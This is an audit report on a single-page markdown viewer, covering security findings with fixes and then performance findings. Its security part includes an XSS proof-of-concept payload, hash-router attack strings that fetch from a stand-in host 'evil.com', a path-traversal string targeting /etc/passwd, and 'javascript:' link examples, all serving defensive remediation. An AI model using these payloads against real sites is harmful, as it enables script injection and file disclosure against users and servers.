# Phase 2: Security & Performance Review

## Security Findings

### Critical

**SEC-CRIT-1. XSS via unsanitized `marked.parse()` sink**
- **CWE:** CWE-79 | **CVSS 3.1:** 8.2 (chains to 9.0 with SEC-CRIT-2)
- **Location:** `index.html:441` — `content.innerHTML = marked.parse(text)`
- `marked` removed its built-in sanitizer in v5 (May 2023). Any `.md` file with `<script>`, `<img onerror>`, `<iframe>`, or `<svg onload>` executes in the origin's context.
- Error path at line 465 also interpolates `err.message` directly into `innerHTML` — foot-gun for future refactors.
- **PoC:** Add `<img src=x onerror="alert(document.domain)">` to any `.md` file and navigate to it.
- **Fix:** Add DOMPurify (pinned, SRI-protected). `content.innerHTML = DOMPurify.sanitize(marked.parse(text), { FORBID_TAGS: ['style','iframe','form','object'], FORBID_ATTR: ['style','onerror','onload'] })`. Use `textContent` for error messages, not `innerHTML`.

**SEC-CRIT-2. Open redirect / path traversal / cross-origin fetch in hash router**
- **CWE:** CWE-601, CWE-22, CWE-918 | **CVSS 3.1:** 7.4 standalone → 9.0 chained with SEC-CRIT-1
- **Location:** `index.html:471-474` — `loadPage(hash.substring(3))` → `fetch(path)` at line 438
- `#p=//evil.com/payload.md` fetches cross-origin (attacker can return `Access-Control-Allow-Origin: *`), response flows into `marked.parse → innerHTML`.
- `#p=https://evil.com/x.md` is identical.
- On non-GitHub-Pages hosts: `#p=../../../etc/passwd` hits server root.
- **Fix:**
```js
function isSafeRepoPath(p) {
    if (typeof p !== 'string' || p.length === 0 || p.length > 256) return false;
    if (!p.endsWith('.md')) return false;
    if (/^[a-z][a-z0-9+.-]*:/i.test(p)) return false;
    if (p.startsWith('//') || p.startsWith('/') || p.startsWith('.')) return false;
    if (p.includes('..') || /[\\\x00-\x1f]/.test(p)) return false;
    return /^[A-Za-z0-9._\-/]+$/.test(p);
}
```
Also anchor fetch to origin: `const target = new URL(path, new URL('./', window.location.href)); if (target.origin !== location.origin) throw new Error('blocked');`

### High

**SEC-HIGH-1. No Subresource Integrity or version pinning on CDN scripts**
- **CWE:** CWE-353, CWE-829 | **CVSS 3.1:** 7.5 (conditional on CDN compromise)
- **Location:** `index.html:26-27, 30`
- `cdn.tailwindcss.com` — unversioned, no SRI, explicitly marked "not for production" by Tailwind. CDN compromise = arbitrary code execution on all visitors.
- `cdn.jsdelivr.net/npm/marked/marked.min.js` — no `@version`, no `integrity`. Tracks npm "latest".
- Google Fonts CSS cannot carry SRI (response varies by UA) — self-host woff2 to fully resolve.
- **Fix:** Pin marked (`@12.0.2`), add `integrity="sha384-..."` + `crossorigin="anonymous"`. Replace Tailwind CDN with a built stylesheet (see perf findings).

**SEC-HIGH-2. `marked` `gfm: true` enables autolinks that can emit `javascript:` URIs**
- **CWE:** CWE-79
- **Location:** `index.html:413`
- Amplifies SEC-CRIT-1 until DOMPurify is in place. Belt-and-suspenders: `marked.use({ renderer: { html: () => '' } })` drops raw HTML blocks before sanitizer.

### Medium

**SEC-MED-1. `err.message` interpolated into `innerHTML` — future XSS foot-gun**
- **CWE:** CWE-209 | **Location:** `index.html:464-465`
- Currently safe (only throws `"File not found"`), but the pattern will be copied and `err.message` in future catch blocks may contain attacker-influenced content.
- **Fix:** Build error DOM with `textContent`. `console.warn` full error; show generic "Document unavailable" to user.

**SEC-MED-2. No Content Security Policy**
- **CWE:** CWE-693 | **Location:** entire document
- A correctly-scoped CSP is the highest-leverage defence-in-depth against SEC-CRIT-1. `connect-src 'self'` alone neutralizes SEC-CRIT-2's cross-origin fetch.
- Note: Tailwind CDN runtime requires `unsafe-eval` for JIT — impossible to include in a meaningful CSP. Fix: replace CDN with built stylesheet, then add CSP.
- **Fix:**
```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'none'; script-src 'self' https://cdn.jsdelivr.net;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com; img-src 'self' data:;
  connect-src 'self'; base-uri 'none'; form-action 'none'; frame-ancestors 'none';
">
```

**SEC-MED-3. Link rewriter accepts `javascript:` and protocol-relative hrefs from markdown**
- **CWE:** CWE-601 | **Location:** `index.html:443-450`
- `!href.startsWith('http')` passes `javascript:foo.md`, `vbscript:`, `//evil/foo.md`. DOMPurify (SEC-CRIT-1) drops `javascript:` hrefs by default — this is defence in depth.
- **Fix:** Validate the rewritten path through `isSafeRepoPath` before writing `#p=`.

### Low

**SEC-LOW-1. `rel="noopener"` without `noreferrer`** — `index.html:314, 346`. Low risk; standardise to `rel="noopener noreferrer"`.
**SEC-LOW-2. Download links carry no integrity assurance** — first-party assets; acceptable. Flag if third-party downloads are ever added.
**SEC-LOW-3. Pinned marked version unknown — CVEs cannot be audited** — pin first (SEC-HIGH-1), then audit against GitHub Advisory Database.

---

## Performance Findings

### Critical

**PERF-CRIT-1. Tailwind CDN JIT compiler is render-blocking — +1,500–3,000 ms FCP on mobile**
- **Location:** `index.html:26`
- Parser-blocking `<script>` downloads ~300 KB, then runs JIT compiler before any styled paint. On LTE in variable connectivity (commute scenario) regularly pushes FCP past 3 s.
- **Fix:** `npx tailwindcss -i input.css -o dist/styles.css --minify` once; commit the ~4 KB output; remove the CDN script. Zero ongoing build step needed.

### High

**PERF-HIGH-1. `marked.js` loaded unconditionally — wasted on dashboard-only sessions**
- **Location:** `index.html:27` — parser-blocking, ~50 KB
- PRODUCT.md: primary goal is "quickly tap to media." Most mobile sessions never open a README.
- **Fix:** Lazy-load `marked` inside `loadPage()` only when reader navigation is triggered. Eliminates the download on pure-dashboard sessions.

**PERF-HIGH-2. No markdown caching — every nav re-fetches**
- **Location:** `index.html:438` — bare `fetch(path)` with no session cache
- Dashboard → Meeting 01 → Dashboard → Meeting 01 = two full round-trips. 300–800 ms each on mobile LTE.
- **Fix:** `const mdCache = new Map(); if (mdCache.has(path)) text = mdCache.get(path); else { text = await fetch(path).then(r=>r.text()); mdCache.set(path, text); }` — 10 lines, prerequisite for hover-prefetch.

**PERF-HIGH-3. `will-change: transform` unconditionally on every card**
- **Location:** `index.html:101` — CSS `.card` rule
- Forces compositor layer allocation at paint time across all 7 current cards. At 30 meetings: ~32 layers, ~70 MB GPU memory on mobile. Causes scroll jank on low-end devices.
- **Fix:** Remove from static rule; apply dynamically on `pointerenter` / remove on `pointerleave`.

### Medium

**PERF-MED-1. No hover/touch prefetch for README links — 300–600 ms perceived latency**
- Prerequisite: PERF-HIGH-2 (cache) must exist first.
- **Fix:** `link.addEventListener('pointerenter', () => fetch(path).then(r=>r.text()).then(t=>mdCache.set(path,t)), { once: true })` — invisible to user, eliminates navigation latency.

**PERF-MED-2. No service worker — zero offline capability for commute use case**
- PRODUCT.md explicitly targets mobile commute access. Subway/tunnel dead zones = full app failure.
- Dashboard HTML is 26 KB; all markdown combined is ~50 KB. Trivially cacheable.
- **Fix:** 50-line network-first-with-fallback `sw.js`. Video/PPTX too large to precache; skip those.

**PERF-MED-3. Font loading blocks text rendering — 200–500 ms FOIT risk**
- **Location:** `index.html:28-30` — Font `<link>` placed after two parser-blocking scripts
- Five weights loaded (300, 400, 500, 600, 700). Weight 300 used only for the author credit (`swiss-light`).
- **Fix:** Move font `<link>` above the script tags. Drop weight 300 if swiss-light is dispensable.

**PERF-MED-4. `renderFileTree` will double-decorate cached DOM if re-rendered**
- **Location:** `index.html:415-427`
- Cache stores raw text; re-render calls `renderFileTree` again. Safe with current flow but fragile if caching is added and render path changes.
- **Fix:** `if (li.firstChild?.classList?.contains('tree-connector')) return;` guard at top of loop.

### Low

**PERF-LOW-1. `animate-pulse` skeleton fires layout cycle before instant fetch resolves** — minor; not worth fixing.
**PERF-LOW-2. URL construction uses `window.location.origin + '/'` — broken on subdirectory deploys** — use `new URL('./', location.href)` as base.

---

## Scalability Projection

| Metric | 5 meetings (now) | 10 | 30 |
|---|---|---|---|
| Cards with `will-change` layers | 7 | 12 | 32 |
| Est. GPU memory (mobile) | ~15 MB | ~25 MB | ~70 MB |
| Cold re-fetch cost if no cache | 300–800 ms | same | same |
| Hand-edit lines per new meeting | ~65 | ~65 | ~65 |

---

## Critical Issues for Phase 3 Context

1. **No tests exist at all** — the entire app is one HTML file with no test harness. Phase 3 should assess what a minimal testing strategy looks like for this architecture.
2. **XSS fix (DOMPurify) must be validated** — Phase 3 should recommend a test that confirms the sanitizer is working in practice, not just installed.
3. **Service worker offline capability** — Phase 3 documentation should cover the user flow for offline access.
4. **The `isSafeRepoPath` validator** — Phase 3 should recommend a test matrix for path validation edge cases.
